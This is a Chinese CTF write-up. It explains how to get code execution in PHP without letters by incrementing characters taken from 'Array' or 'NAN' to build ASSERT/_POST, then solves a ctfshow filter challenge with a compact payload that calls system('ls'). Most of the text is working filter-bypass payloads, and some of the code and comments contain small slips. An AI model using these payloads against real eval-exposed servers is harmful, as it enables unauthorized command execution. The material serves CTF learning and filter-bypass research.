## **用自增实现无字母RCE**
前提能$符号

有如下
```
"A"++ ==> "B"
"B"++ ==> "C"
```
也就是说，如果我们能够得到"A"，那么我们就能通过自增自减，得到所有的字母。那么问题就转化为怎么得到一个字符"A"。
在PHP中如果强制连接数组和字符串的话，数组将被转换成字符串，其值为"Array"。
再取这个字符串的第一个字母，就可以获得"A"。
```
<?php
$a = ''.[];
var_dump($a);
```
组合
```
<?php
$_=[].'';   //得到"Array"
$___ = $_[$__];   //得到"A"，$__没有定义，默认为False也即0，此时$___="A"
$__ = $___;   //$__="A"
$_ = $___;   //$_="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$___ .= $__;   //$___="AS"
$___ .= $__;   //$___="ASS"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;   //得到"E"，此时$__="E"
$___ .= $__;   //$___="ASSE"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到"R"，此时$__="R"
$___ .= $__;   //$___="ASSER"
$__++;$__++;   //得到"T"，此时$__="T"
$___ .= $__;   //$___="ASSERT"
$__ = $_;   //$__="A"
$____ = "_";   //$____="_"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"P"，此时$__="P"
$____ .= $__;   //$____="_P"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"O"，此时$__="O"
$____ .= $__;   //$____="_PO"
$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$____ .= $__;   //$____="_POS"
$__++;   //得到"T"，此时$__="T"
$____ .= $__;   //$____="_POST"
$_ = $$____;   //$_=$_POST
$___($_[_]);   //ASSERT($POST[_])
```
缩减后
```
```

学习：<https://www.cnblogs.com/m1xian/p/18360023>
注意：执行的时候要进行一次 URL 编码+好，否则 Payload 无法执行。




^
## **如果允许0，可以更短**
还有1/_==INF，下划线也可快速构造NAN，如

```bash
	$a=_/_._;   // NAN_
```

如此，有`'N'==$a[0]`
N 跟 O 很近，构造 _POST，通过二次引用即 $\_POST[0](https://www.cnblogs.com/viistar/p/$_POST%5B_%5D); 可执行任意php代码。\
注意$a++; ++$a;的区别，建议先加再用。\
能用的短变量有`$_` 、`$__` 、`$_0` 三个.后面才知道还能用不可见字符替换php变量名称`$%ff`，这样就更短了。\
题目

```php
	<?php

	//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。

	error_reporting(0);

	highlight_file(__FILE__);

	 

	if (isset($_POST['ctf_show'])) {

	    $ctfshow = $_POST['ctf_show'];

	    if (is_string($ctfshow) && strlen($ctfshow) <= 84) {

	        if (!preg_match("/[a-zA-Z1-9!'@#%^&*:{}\-<\?>\"|`~\\\\]/",$ctfshow)){

	            eval($ctfshow);

	        }else{

	            echo("Are you hacking me AGAIN?");

	        }

	    }else{

	        phpinfo();

	    }

	}
```

我的解法81位

```php
	<?php 

	$a=(_/_._)[0];// NAN 取 N

	$aa=++$a;// O

	$a0=++$a.$aa;// PO

	++$a/++$a;

	$a=_.$a0.=++$a.++$a;// _.POST

	$$a[0]($$a[_]);

	//var_dump($a);
```

去掉注释，php开头，替换a为下划线得

```powershell
	$_=(_/_._)[0];$__=++$_;$_0=++$_.$__;++$_/++$_;$_=_.$_0.=++$_.++$_;$$_[0]($$_[_]);
```

接下来url编码，post传`ctf_show=xxxxx&0=system&_=ls`，搞定！

ps: url编码的三种方法\
1.python 的from urllib import quote\
2.php的 echo urlencode\
3.burp suite 的decode 标签\
最短rce5长度72，以后通杀无字母数字！

